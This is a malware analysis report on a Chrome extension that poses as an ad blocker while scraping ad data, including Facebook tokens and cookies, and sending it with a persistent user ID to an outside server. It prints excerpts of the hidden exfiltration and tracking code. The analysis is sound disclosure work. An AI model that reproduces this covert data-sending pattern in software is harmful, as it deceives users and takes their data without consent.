# Vulnerability Report: Ad Blocker

## Metadata
- **Extension ID**: lhbcckpdmckocfeiggfkbgibnhjjldkp
- **Extension Name**: Ad Blocker
- **Version**: 2.0.0
- **Users**: Unknown
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

This extension presents itself as a simple ad blocker ("Blocks Ads from websites") but contains extensive hidden functionality to scrape and exfiltrate advertising data from Facebook Ad Library and Google Ad Transparency Center. The extension automatically collects comprehensive ad metadata including creative content, targeting information, budgets, and geographic data, then transmits this information to `newbackend.ads-collect.com` without any disclosure to users.

The extension's dual nature - providing basic YouTube ad blocking as advertised while conducting sophisticated ad intelligence gathering in the background - represents a critical privacy violation and deceptive practice. Users installing this extension have no indication that their browsing activity is being used to build a competitive intelligence database.

## Vulnerability Details

### 1. CRITICAL: Undisclosed Ad Data Exfiltration to Third-Party Server

**Severity**: CRITICAL
**Files**: background/background.js (lines 1-95), content/googleads.js, content/content.js
**CWE**: CWE-359 (Exposure of Private Information), CWE-506 (Embedded Malicious Code)
**Description**: The extension implements a comprehensive scraping system that collects detailed advertising data from Google Search results, Facebook Ad Library, and Google Ad Transparency Center, then exfiltrates this data to `https://newbackend.ads-collect.com`.

**Evidence**:

```javascript
const DOMAIN = "https://newbackend.ads-collect.com"

// Background script (lines 84-95)
} else if (request.message === "post-googleSearch-ads") {
    const { ads } = request
    if (ads.length > 0) {
      const userId = await getUserId()
      const endpoint = `${DOMAIN}/api/googleSearch/ad-blocker`
      const settings = buildSettings(ads)
      await postFetch(endpoint, settings)
    }
}

// Content script triggers scraping on every page load (content.js:129)
sendMetaMessageToBackground('start_scraping', {}).then(response => {
}).catch(err => {
});

// Background handler (lines 2753-2759)
if (message === "start_scraping") {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      const activeTab = tabs[0];
      if (isValidUrl(activeTab)) {
        collectGoogleAds();
        collectAds();  // Scrapes Facebook/Meta ads
      }
    });
}
```

**Google Search Ad Data Collected** (googleads.js):
- Ad position, search query text
- Ad name, appearance URL, redirect URL
- Title, description, favicon
- Call-to-action buttons and metadata
- Sitelinks and extensions

**Facebook/Meta Ad Library Data Collected** (background.js, lines 850-2500):
- Complete ad creatives (images, videos, text)
- Advertiser information and page IDs
- Geographic targeting data
- Ad spend ranges and impressions
- Start/end dates for campaigns
- XSRF tokens and cookies from Facebook

**Google Ad Transparency Data Collected** (background.js, lines 1800-2400):
- Advertiser verification status
- Creative content and formats
- Domain and page information
- Country-specific ad data
- Video thumbnails from YouTube

**Verdict**: This is malicious behavior. The extension description makes no mention of data collection or scraping functionality. Users believe they are installing a simple YouTube ad blocker, but the extension is actually a sophisticated ad intelligence gathering tool that monitors their browsing and extracts comprehensive advertising data to build a competitive database.

### 2. CRITICAL: Persistent User Tracking with Generated Identifier

**Severity**: CRITICAL
**Files**: background/background.js (lines 5-52)
**CWE**: CWE-359 (Exposure of Private Information)
**Description**: The extension generates a persistent user identifier on installation and includes it with all data exfiltration requests, enabling long-term tracking of individual users' browsing patterns.

**Evidence**:

```javascript
chrome.runtime.onInstalled.addListener((details) => {
  let value = true;
  let userId = Math.random()
    .toString(36)
    .slice(2)

  if (details.reason == "install") {
    chrome.storage.local.set({ userId })
  } else if (details.reason == "update") {
    chrome.storage.local.get(null, (res) => {
      if (!res.userId) {
        chrome.storage.local.set({ userId })
      }
    })
  }
})

const getUserId = async () => {
  return new Promise((resolve, reject) => {
    chrome.storage.local.get('userId', (res) => {
      resolve(res.userId)
    })
  })
}

// Used in exfiltration (line 90)
const userId = await getUserId()
const endpoint = `${DOMAIN}/api/googleSearch/ad-blocker`
```

**Verdict**: The generated userId enables the backend to correlate all scraped ad data with individual extension installations, building detailed profiles of what ads users are exposed to across all their browsing sessions. This is undisclosed tracking.

## False Positives Analysis

The basic YouTube ad blocking functionality (content/content.js lines 43-74) appears to be legitimate:
- Automatically clicks skip buttons on skippable ads
- Fast-forwards through unskippable ads by manipulating video.currentTime
- Removes ad overlays and sponsored content sections

This functionality does work as advertised. However, this represents only ~5% of the extension's codebase. The remaining 95% is dedicated to ad scraping infrastructure that users have no knowledge of.

The declarativeNetRequest rules (rules.json, rules2.json) may contain legitimate ad blocking filters, but these are secondary to the extension's true purpose.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| newbackend.ads-collect.com/api/googleSearch/ad-blocker | Receive Google Search ad data | Complete ad metadata including position, text, URLs, CTAs for every Google Search ad encountered | CRITICAL - Undisclosed exfiltration |
| adstransparency.google.com | Scrape Google Ad Transparency data | Requests with spoofed headers to extract advertiser data | HIGH - Automated scraping of public transparency data |
| www.facebook.com/api/graphql/ | Scrape Facebook Ad Library | GraphQL queries with cookies/tokens to extract Meta ad campaigns | HIGH - Automated scraping requiring authentication |

## Attack Surface

The extension runs content scripts on `<all_urls>` with `document_start` timing, giving it:
- Access to inject code before page security mechanisms load
- Ability to intercept and modify all page content
- Complete visibility into user's browsing activity
- Access to extract HTML from every page visited

The `start_scraping` message is sent automatically on every valid page load (content.js:129), triggering the scraping functions without any user interaction.

## Overall Risk Assessment

**RISK LEVEL: CRITICAL**

**Justification**:

This extension engages in deceptive practices by masquerading as a simple ad blocker while operating a sophisticated ad intelligence gathering operation. The critical risk factors are:

1. **Undisclosed Data Collection**: No mention in the extension description or privacy policy of scraping/exfiltration
2. **Comprehensive Surveillance**: Monitors all Google Search results and attempts to scrape Facebook/Google ad transparency data
3. **Third-Party Exfiltration**: Sends collected data to external server (ads-collect.com) without consent
4. **Persistent Tracking**: Assigns permanent user IDs to correlate browsing patterns over time
5. **Broad Permissions Abuse**: Uses `<all_urls>` access to monitor all web browsing, far beyond ad blocking requirements

The extension violates Chrome Web Store policies on deceptive behavior and user data disclosure. Users installing this extension expecting simple ad blocking are unknowingly participating in a commercial ad intelligence gathering operation.

**Recommended Action**: Immediate removal from Chrome Web Store and warning to existing users to uninstall.
